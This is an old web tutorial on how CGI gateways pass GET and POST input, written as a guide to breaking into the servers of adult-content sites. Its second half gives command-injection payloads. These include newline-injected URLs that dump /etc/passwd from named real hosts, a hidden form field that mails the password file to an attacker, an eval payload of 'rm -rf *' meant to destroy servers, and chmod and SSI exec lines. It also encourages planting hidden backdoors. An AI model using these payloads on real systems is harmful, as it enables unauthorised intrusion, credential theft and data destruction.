<I>

What is CGI-script reverse engineering?<BR>

Well, if we want to crack the smut dealers, we must first understand a little 

how their gateways 

work... so first of all  you must understand what are gateways... in fact there 

is quite a lot you should understand before waging this battle... let's begin!

<BR>

Remember that you can use gateways running on Internet, install gateways that 

have been developed by others or develop your own.

<BR>

The CGI is the mechanism for communicating between your gateway and your Web 

server.<BR>

Let's be clear on this: When the user enters text on a form, or in response 

to an ISINDEX query, and hits the return key, the Web browser sends keystrokes 

captured from the user to the httpd server.<BR>

When an HTML document contains an ISINDEX tag, the browser displays an input box with the phrase:<BR></I><PRE>

This is a searchable index. Enter search keywords: type-input-here</PRE><I>

Here you have an example of it:<ISINDEX><BR>

This does NOT mean that your HTML document is automatically a searchable index. The 

ISINDEX tag just captures user keystrokes and sends those keystrokes to a gateway using 

the GET method. The GATEWAY performs the actual search. If the gateway does not exist, 

placing the ISINDEX tag in the HTML document will not make it exist, altough it will 

look to the user as though it exists. The user can certainly key in a search string. 

But when the return key is hit, no search will occur. Try it on the ISINDEX window above.Now.<BR> 

Nothing happens: to have your Web server 

perform search functions you must develop or set up a gateway to perform the search. 

<BR>

The htppd server accepts the input, which will come through a FORM or an ISINDEX tag, 

starts up the gateway 

and hands the input to the gateway via the CGI.<BR>

The user's keystrokes are passed to the gateway either via environment variables 

(called the GET method) or using standard input (called the POST method). The 

gateway then passes the input and process it. It may generate HTML output, which 

is returned to the httpd server to pass to the client, or it may save data in a 

file or database or send email to someone.<BR>

<BR>

The gateway itself can be a script or program, written in C/C++, Perl, tcl, 

the C Shell or the Bourne Shell. Each language has its own strengths as a 

gateway language.<BR>

<BR>

CGI gateways that generate HTML output are required to preface the HTML output 

to stdout with the following line:<BR><PRE>

Content-type: text/html</PRE>

This line must be followed by a blank line before the first &lt;HTML&gt; tag is sent.<BR>

<BR>

The gateway does not have to generate HTML. It could return the URL of another file, 

indicating to the browser that it should get that file. This is called <U>URL 

redirection</U>. In fact this is the most commonly used method that the 

commercial smut-dealers 

use to pass some specific images to the user<BR>

CGI gateways using URL redirection write the following line to 

stdout:<BR></I><PRE>

Location: URL</PRE><I>

This line, too, must be followed by a blank line before the stdout data stream 

terminates.<BR>

<BR>

Passing parameters to CGI scripts by appending them to the URL is referred to as 

the GET method. 

CGI scripts written to use the GET method must explicitly read the QUERY_STRING 

variable to get and then parse the query. The GET method is usually used to invoke 

a simple CGI script with a single parameter.<BR>

<BR>

For example, to pass your name (Fravia of TheHCU) to the test-cgi gateway, located 

in cgi-bin, you would open the following URL:<BR><PRE>

http://hostname/cgi-bin/test-cgi?Fravia+of+TheHCU</PRE>

The incoming parameter is appended to the base URL after the ? character, with 

blanks replaced by the + character. The parameter is set as an environment variable 

called QUERY_STRING, but is not passed to test-cgi as a command line option, or in 

standard input. The HTML output returned from this URL would be (since test-cgi 

describes how the httpd server is configured and what information is being passed 

generically to all CGI scripts, more or less the following:<BR></I><PRE>

CGI/1.0 test script report:



argc is 3. Argv is Fravia of TheHCU



SERVER_SOFTWARE = NCSA/1.3

SERVER_NAME = hostname

GATEWAY_INTERFACE = CGI/1.1

SERVER_PROTOCOL = HTTP/1.0

SERVER_PORT = 80

REQUEST_METHOD = GET

HTTP_ACCEPT = text/plain, application/x-html, application/html,

text/x-html, text/html, image/*, application/postscript, video/mpeg,

audio/basic, audio/x-aiff, image/gif, image/Jpeg, image/tiff,

...

...

text/richtext, text/tab-separated-values, text/x-setext, */*

PATH_INFO =

PATH_TRANSLATED =

SCRIPT_NAME = /cgi-bin/test-cgi

QUERY_STRING = Fravia+of+TheHCU

REMOTE_HOST = xxx.xxx.xxx

REMOTE_ADDR = xxx.xxx.xxx.xxx

REMOTE_USER =

AUTH_TYPE =

CONTENT_TYPE =

CONTENT_LENGTH =</PRE><I>

All of the capitalized variable names (like SERVER_NAME) are environment 

variables that are set by the CGI. These are available to be used by your 

gateway. As you have seen, parameters can be passed to a gateway by appending 

them to the URL using the following scheme:<BR></I><PRE>

URL?first+second+third</PRE><I>

<BR>

That was it for the GET method. 

<BR>Alternatively, parameters can be passed to CGI 

scripts using standard input, this is called the POST method. It is used when 

there is a large amount of information that would be awqward to append to the 

end of the URL (as with the GET method) or when the parameters need to be encoded. 

Most of the advanced work on secure transactions on the net is focused on secure 

encoding techniques for the POST method.<BR>

<BR>

When using the POST method, two parameters, for a user's name and email 

address, might look like:<BR></I><PRE>

NAME=Fravia+of+TheHCU&EMAIL=msre@chez.com</PRE><I>

The CGI script would then parse the two parameters as:<BR></I><PRE>

NAME		Fravia of TheHCU

EMAIL		msre@chez.com</PRE><I>

The & character separates the parameter pairs and the = character separates each 

parameter name from his value. The + character is used again as a substitute for 

blanks. The Perl CGI library contains code to parse standard input to load an 

associative array for processing.<BR>

<BR>

If the CGI-scripts are not carefully written the server can have problems: anytime 

it captures user keystrokes, those keystroke could be malicious. Attacking a Web 

server usually consist in embedding shell metacharacters inside our input, seeking 

the execution of 

arbitrary commands on the system that runs the gateway, a danger particularly common, 

with older CGI gateways written in the Bourne or C Shell, in Perl or in any language 

where an interpreter can execute commands external to the gateway.<BR>

<BR>

Rather than trapping "problem" metacharacters, the CGI scripts use simply 

a regular expression to check for legal keystrokes:<BR></I><PRE>

[a-zA-Z0-9_-+ \t\/@%]</PRE><I>(There is a blank space after the + sign)<BR>

<BR>

<FONT color=red>Now starts the really interesting part :-)</FONT><BR>

The "newline" char is often allowed (%0a), and you can use it to execute commands 

that are DIFFERENT from the commands that the script awaits, you can therefore add 

a field to a URL to execute functions that are outside the script, for example the 

following URL asks from the server a copy of /etc/passwd:<BR><PRE>

http://www.odci.gov/cgi-bin/query?%0a/bin/cat%20/etc/passwd</PRE>

The characters ASCII "0a" and "20" are respectively a newline and a space.<BR>

<BR></I><FONT size=+2>Form processing</FONT><BR>

Forms are a natural progression from simple queries and are officially part of HTML 

version 3.0.<BR>

Here you have an example:<BR><HR size=2><FONT color=purple>

<EM>Please send us your comments!</EM>

<P>

<HR size=1 width=33%>

<P>

<FORM METHOD="POST" ACTION="http://fravia.org/cgi-bin/comments" >

Name: <INPUT TEXT NAME="feedback_name" size=36><BR>

Email: <INPUT TEXT NAME="feedback_email" size=36><BR>

<P>

<TEXTAREA NAME="feedback_comments" ROWS=4 COLS=30>

</TEXTAREA>

<P>

<INPUT TYPE="submit" VALUE="Send Comments">

<INPUT TYPE="reset" VALUE="Clear Form">

</FORM></FONT>

<HR size=2>

<BR>

<I>

Each INPUT tag has a variable name associated. The CGI scripts filter the contents 

of the field INPUT, if they don't you have a similar situation ro the previous one, 

and your data are directly passed to the interpreter.<BR><BR>

Another used HTML tag is the SELECT tag, that allows to the user on the client 

machine to select between a number of options. This selection gives also a value 

to a specified variable.<BR>

The CGI-scripts usually DO NOT check this value, assuming that there is only a 

predefined number of choices, and these values go directly to the interpreter 

for interpreted languages.<BR>

A typical sendmail attack is made using the characters "~!", on vulnerable systems.<BR>

If there is a CGI-script with a call to the UNIX system with only ONE argument, 

you can attack that system, because the system in that case forks a shell in order

 to allow the request, for instance the following PERL script:<BR></I><PRE>

system("/usr/bin/sendmail -t %s &lt; %s", $address_to_email &lt; $file_entered</PRE><I>

has been designed to email a copy of file_entered to the email address 

address_to_email. Since the script calls system with only one argument, 

this program runs a separated shell, apt to be forked.<BR>

Now copy and MODIFY the same data:<BR></I>

<PRE>

&lt;INPUT TYPE="HIDDEN" NAME="address_to_email" VALUE="address@server.com;mail cracker@his.address &lt;/etc/passwd"&gt;

</PRE>

<I>

You get it? In this way you can get the file /etc/passwd of that server<BR>

<BR>

The function system() is not the only command to fork a new shell. 

The function exec(), with only one argument allows the same attacks. 

Opening a file and piping its result opens also a separate shell. 

In PERL the function :<BR></I><PRE>

open(FILE, "| program_name $ARGS")</PRE><I>

opens a FILE and pipes its contents with program_name, which will be executed as 

separated shell.<BR>

<BR>

The PERL command "eval" executes any argument you pass. The CGI-script that pass 

user data to the command 

eval can be used to execute ANYTHING that the user wishes, on the 

smut dealers sites I would suggest, first to check if the "" passed to 

the interpreter are accepted<BR></I><PRE>

$_ = $VALUE; s/"/\\" /g		$RESULT = eval qq/"$_"/;</PRE><I><BR>

And then <FONT color=red>destroy</FONT> the smut dealer server with VALUE 

containing<BR></I><PRE>

"rm -rf *"</PRE><I>

<BR>

CGI-script are READABLE, and you can copy them, modify them or substitute them.<BR>

PERL scripts containing include lines like the following:<BR></I><PRE>

require "cgi-lib"</PRE><I>

Include the cgi-lib library. If the file permissions are not correct, 

the script IS vulnerable! You may want to verify the permission adding to the 

URL of a cgi-script (using the method GET) following characters:<BR></I><PRE>

"%0a/bin/ls%20-la%20/usr/src/include</PRE><I><BR>

If you copy, modify and substitute the library, you will be able to execute 

commands or routines from inside the library file.<BR>

<BR>

The PERL interpreter dwells mostly in usr/bin. If it has been run as SETSUID 

root, you may modify the file permissions with a direct command to the system:<BR></I><PRE>

$_ = "chmod 666\/etc\/passwd" $RESULT = eval qq/"$_"/;</PRE><I><BR>

And now the passwd file can be accessed by everybody.<BR>

<BR>

Finally there is an extension that some http server allow: the SSI (Server Side 

Include). Most SSI have been disabled, but there are still many out there. 

The syntax is:<BR></I><PRE>

!-- #command variable="value" --</PRE><I><BR>

If the script does not filter the input, you may write:<BR></I><PRE>

!-- #exec cmd="chmod 666 /etc/passwd" --</PRE><I>

"exec cmd" then runs a shell and executes the command you wrote between "", in 

this case chmod. Obviously as soon as you gain etc/passwd you can lame the site 

of the Smut dealer, or even better, 'seed' therein hundred concealed 'entrances' 

for later eaiser busting :-)<BR><BR>

<FONT size=+2>Where are located the CGI-scripts?</FONT><BR>

CGI scripts can be placed in THREE locations, the main cgi-bin subdirectory, 

alternative, cgi-bin subdirectories (that have been established with the 

ScriptAlias directive) AND in users' personal HTML subdirectories.<BR>

Web server administrators police very seldom all these areas, mostly (if 

they do it) they limit themselves to check that the Options directive, used to 

protect users' personal HTML directories is not set to All or ExecCGI.<BR>

On the other hand, if they don't trust a SPECIFIC user, they usually specify 

the Options directive in access.conf to be used server-wide and then use<BR><PRE>

AllowOverride None</PRE>

Here are, courtesy of +gthorne, some nice 'starter' tricks you may want to 

use to UNDERSTAND how all this work and how frequently Web servers allow 

you more access than it you would believe (PLEASE, do not destroy yet 

vrysex.com, I need it alive for teaching purposes):<BR><PRE>

http://www.vrysex.com/cgi-bin/nph-test-cgi?*<BR></PRE>

(This gives information even if not available :-)<BR><PRE>

http://www.vrysex.com/cgi-bin/test-cgi?*

http://www.vrysex.com/cgi-bin/nph-test-cgi?/*

http://www.vrysex.com/cgi-bin/nph-test-cgi?etc/*<BR></PRE>

Remeber also that the standard Web account (the default user ID) 

is called<BR><PRE>

Username: nobody<BR></PRE>

This isn't root, of course, but it gives nevertheless access to all that

 an user can if he has an account on the system (otherwise web pages 

wouldn't work at all. BTW, the dafault Group is -1

<BR><BR>

<FONT size=+2>Defaults of a standalone daemon</FONT><BR>

<FONT size=+1>(know what you should be looking for on the smut sites)</FONT><BR>

<BR>

<FONT color=blue>httpd.conf</FONT> = Main server configuration file<BR>

<I>This controls HOW the server runs, not details relating to the files it serves</I><BR>

<FONT color=blue>srm.conf</FONT>	= Server resource configuration file<BR>

<I>

DocumentRoot directive, points per default to /usr/local/etc/httpd/htdocs

<BR>

UserDir = public_html per default! If the seradm forgot to set it to DISABLED, 

users could serve files from their home directories!<BR>

If the cgi-bin directory is not at default location /usr/local/etc/httpd/cgi-bin/, its new location can 

be found inside the Alias or ScriptAlias directives!<BR>

AccessFileName = .htaccess<BR>

DocumentRoot = /usr/local/etc/httpd/htdocs<BR>



</I>

<BR>

<FONT color=blue>access.conf</FONT> = Global access control file (ACF)<BR>

<BR>

Default User ID (UID) =	nobody<BR>

Default User Group (UIG) = -1<BR>

Recommended UID = http<BR>

Reccomended UIG = WWW<BR>

<I>(These names must exist in /etc/passwd and etc/group respectively)</I><BR>

ServerAdmin =	webmaster@local.domain<BR>

ServerRoot = /usr/local/etc/passwd<BR>

ServerName = www.local.domain (or a CNAME alias)<BR>

ServerType = standalone<BR>





<BR><HR size=2 width=55%>

<FONT size=+2>A first Conclusion</FONT><BR>

The incorrect use of the CGI scripts implies many vulnerabilities for the 

system hosting them.<BR>

Most smut dealer have little or no knowledge of programming but NEED always 

some sort of script to give the authorised suckers their smut and leave out 

everybody else... mostly they will have set their scripts on the quick way, 

using often incapable programmers... a world of possibilities for us!
